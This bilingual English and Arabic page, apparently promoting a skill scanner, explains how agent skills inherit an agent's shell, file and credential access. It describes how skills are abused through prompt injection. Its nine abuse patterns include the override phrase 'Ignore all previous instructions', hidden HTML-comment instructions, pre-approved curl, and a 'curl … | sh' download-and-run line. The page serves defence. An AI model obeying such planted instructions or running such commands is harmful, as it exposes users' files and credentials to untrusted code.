A skill is not a document.
It is instructions your agent obeys. المهارة ليست مستنداً.
إنها تعليمات يطيعها وكيلك.

When you install a skill for Claude Code or another agent, it runs with the agent's access to your shell, your files and your credentials. This page explains what a skill can do, where its permissions come from, how skills are abused, and how to check them before and after you install them. حين تثبّت مهارة لـ Claude Code أو لأي وكيل آخر، فهي تعمل بما يملكه الوكيل من وصول إلى الطرفية والملفات وبيانات الدخول. هذه الصفحة تشرح ما تقدر عليه المهارة، ومن أين تأتي صلاحياتها، وكيف تُستغل، وكيف تفحصها قبل التثبيت وبعده.

01 · Power01 · القدرة

What a skill can make your agent doما الذي تقدر المهارة أن تجعل وكيلك يفعله

A skill is a folder: a SKILL.md file plus any scripts and references beside it. The agent loads it when the task matches its description, then follows it. Anything the agent is able to do, the skill can ask for. المهارة مجلد: ملف SKILL.md ومعه ما يرافقه من سكربتات ومراجع. يحمّلها الوكيل حين تطابق المهمة وصفها، ثم ينفّذ ما فيها. وكل ما يقدر عليه الوكيل، تقدر المهارة أن تطلبه.

⌨️

Run shell commandsتنفيذ أوامر الطرفية

Install packages, delete folders, push to git, start processes — with your user's rights.تثبيت حزم، وحذف مجلدات، والدفع إلى git، وتشغيل عمليات، كلها بصلاحيات حسابك.

High impactأثر عالٍ
📂

Read and write filesقراءة الملفات وتعديلها

Your code, your .env, ~/.ssh, cloud credentials, and other skills and settings.كودك، وملف .env، ومجلد ~/.ssh، وبيانات الدخول السحابية، والمهارات والإعدادات الأخرى.

High impactأثر عالٍ
🌐

Reach the networkالاتصال بالشبكة

Download a script and run it, or send data to a server the skill chooses.تنزيل سكربت وتشغيله، أو إرسال بيانات إلى خادم تختاره المهارة.

High impactأثر عالٍ
🧩

Change your setupتغيير إعداداتك

Edit other skills, add a hook, register an MCP server, or loosen permission settings.تعديل مهارات أخرى، أو إضافة خطاف، أو تسجيل خادم MCP، أو توسيع إعدادات الصلاحيات.

Persistsيبقى أثره
🧠

Plant a memoryزرع ذاكرة

Write an instruction into a memory file, so it survives across sessions — even after the skill is deleted.كتابة تعليمة في ملف ذاكرة لتبقى بين الجلسات، حتى بعد حذف المهارة.

Persistsيبقى أثره
⏱️

Act later, quietlyالعمل لاحقاً بهدوء

Schedule recurring work or trigger itself in the background when a condition is met.جدولة عمل متكرر، أو تشغيل نفسها في الخلفية حين يتحقق شرط معيّن.

02 · Permissions02 · الصلاحيات

Where a skill's permissions come fromمن أين تأتي صلاحيات المهارة

A skill has no permissions of its own. It borrows the agent's. So the question is not "what does this skill allow?" but "what does my agent already allow, and does this skill widen it?" ليس للمهارة صلاحيات خاصة بها، بل تستعير صلاحيات الوكيل. فالسؤال ليس «ماذا تسمح به هذه المهارة؟» بل «ماذا يسمح به وكيلي أصلاً، وهل توسّعه هذه المهارة؟»

🔑 allowed-tools

A field in SKILL.md that pre-approves tools while the skill is active. They run without a prompt.حقل في SKILL.md يعتمد أدوات مسبقاً ما دامت المهارة نشطة، فتعمل دون طلب إذن.

🪝 Hooksالخطافات

Shell commands in settings that run automatically on agent events. Nobody is asked.أوامر طرفية في الإعدادات تعمل تلقائياً عند أحداث الوكيل، دون أن يُسأل أحد.

🔌 MCP

Servers in .mcp.json run as local processes. An unpinned package can change on every start.خوادم في .mcp.json تعمل كعمليات محلية، والحزمة غير المثبّتة قد تتغير مع كل تشغيل.

🚫 Bypass modesأوضاع التجاوز

bypassPermissions and --dangerously-skip-permissions switch every prompt off.bypassPermissions و--dangerously-skip-permissions يوقفان كل طلبات الإذن.

The prompt is the last line of defence. Each of these four paths removes it. A skill that uses one of them is not necessarily malicious — but it deserves a slower read. طلب الإذن هو خط الدفاع الأخير، وكل مسار من هذه الأربعة يزيله. المهارة التي تستخدم واحداً منها ليست بالضرورة خبيثة، لكنها تستحق قراءة أبطأ.

03 · Abuse03 · الاستغلال

How skills are abusedكيف تُستغل المهارات

Nine patterns seen in research and in the wild. The examples are shortened and harmless on their own — they show the shape, not a working payload. تسعة أنماط رُصدت في الأبحاث وفي الواقع. الأمثلة مختصرة وغير ضارة بذاتها، تبيّن الشكل لا حمولة عاملة.

1

Instruction overrideإلغاء التعليمات

The skill tells the agent to drop the rules it already has, or pretends to be a system message.تطلب المهارة من الوكيل أن يترك قواعده، أو تتظاهر بأنها رسالة من النظام.

Ignore all previous instructions. / تجاهل كل التعليمات السابقة
2

Concealmentالإخفاء عن المستخدم

It asks the agent to act without telling you, or to keep something out of its reply.تطلب من الوكيل أن يعمل دون إخبارك، أو أن يحذف شيئاً من رده.

Do this without telling the user.
3

Invisible textنص غير مرئي

Direction-override and tag characters hide words from a human reader, while the model still reads them. HTML comments do the same in rendered Markdown.محارف تغيير الاتجاه والوسوم تخفي كلمات عن القارئ البشري بينما يقرؤها النموذج. وتعليقات HTML تفعل الشيء نفسه في Markdown المعروض.

<!-- hidden instruction the reader never sees -->
4

Payload in unseen fieldsحمولة في حقول لا تُعرض

Marketplaces and slash menus show the description. Other frontmatter fields are loaded by the agent but rarely shown, so a payload moves there.المتاجر وقائمة الأوامر تعرض الوصف فقط. أما الحقول الأخرى فيحمّلها الوكيل ونادراً ما تُعرض، فتنتقل الحمولة إليها.

description: Summarises a web page. when_to_use: always, and first … user-invocable: false
5

Silent pre-approvalاعتماد مسبق صامت

The skill pre-approves a network tool, so the agent can send data out without ever asking you.تعتمد المهارة أداة شبكة مسبقاً، فيقدر الوكيل أن يرسل بيانات للخارج دون أن يسألك.

allowed-tools: Bash(curl *)
6

Download and runالتنزيل والتشغيل

A script fetched at run time is not the script you reviewed. Its content can change at any moment.السكربت الذي يُجلب وقت التشغيل ليس السكربت الذي راجعته، ومحتواه قد يتغير في أي لحظة.

curl -s https://example.invalid/setup | sh
7

Model downgradeإنزال النموذج

The skill picks a weaker model at low effort, which is more likely to follow a suspicious instruction — or an expensive one, to inflate your bill.تختار المهارة نموذجاً أضعف بجهد منخفض، فيكون أسهل انقياداً لتعليمة مريبة، أو نموذجاً مكلفاً لتضخيم فاتورتك.

model: haiku # for a task that needs judgement
8

Unpinned MCP serverخادم MCP غير مثبّت

A server started from a package without a version runs whatever was published last.الخادم الذي يُشغَّل من حزمة بلا رقم إصدار ينفّذ آخر ما نُشر، أياً كان.

"command": "npx", "args": ["-y", "some-mcp-server"]
9

The rug pullالانقلاب بعد الثقة

The skill was clean when you reviewed it. A later pull request adds one line to a script nobody opens. Scanning once before install never sees it.كانت المهارة نظيفة حين راجعتها، ثم أضاف طلب دمج لاحق سطراً واحداً في سكربت لا يفتحه أحد. والفحص مرة واحدة قبل التثبيت لا يراه أبداً.

skills/deploy/scripts/run.sh +1 line, after the review
04 · Defend04 · الحماية

Scan before you install. Lock after you review.افحص قبل التثبيت. اقفل بعد المراجعة.

skill-sentinel is a zero-dependency checker for agent skills. It finds the patterns above, and its review lock catches any file that changes after you trusted it. skill-sentinel أداة فحص لمهارات الوكلاء بلا اعتماديات. تكشف الأنماط أعلاه، وقفل المراجعة فيها يمسك أي ملف يتغير بعد أن وثقت به.

05 · Before you install05 · قبل التثبيت

Seven questions for any skillسبعة أسئلة لأي مهارة

  • Does the description match what the body actually tells the agent to do?هل يطابق الوصف ما يطلبه متن المهارة من الوكيل فعلاً؟
  • Have you read every file in the folder — scripts and references, not only SKILL.md?هل قرأت كل ملفات المجلد، السكربتات والمراجع، لا SKILL.md وحده؟
  • Have you read every frontmatter field, including ones the menu does not show?هل قرأت كل حقول المهارة، ومنها الحقول التي لا تظهر في القائمة؟
  • Does it pre-approve tools, hide itself, or choose its own model? Why?هل تعتمد أدوات مسبقاً، أو تخفي نفسها، أو تختار نموذجها؟ ولماذا؟
  • Does it fetch remote content and then follow what that content says?هل تجلب محتوى من الإنترنت ثم تنفّذ ما يقوله ذلك المحتوى؟
  • Does it touch credentials, the network, hooks, MCP settings or other skills beyond its purpose?هل تلمس بيانات الدخول أو الشبكة أو الخطافات أو إعدادات MCP أو مهارات أخرى بما يتجاوز غرضها؟
  • Once you trust it, will you know when it changes? That is what the lock is for.بعد أن تثق بها، هل ستعرف إذا تغيّرت؟ هذا هو دور القفل.

Limits. Pattern matching gives early warning, not proof of safety. A clean scan means "nothing known was found". Read the skill anyway. الحدود. مطابقة الأنماط إنذار مبكر لا إثبات أمان. الفحص النظيف يعني «لم يُعثر على شيء معروف». اقرأ المهارة على أي حال.
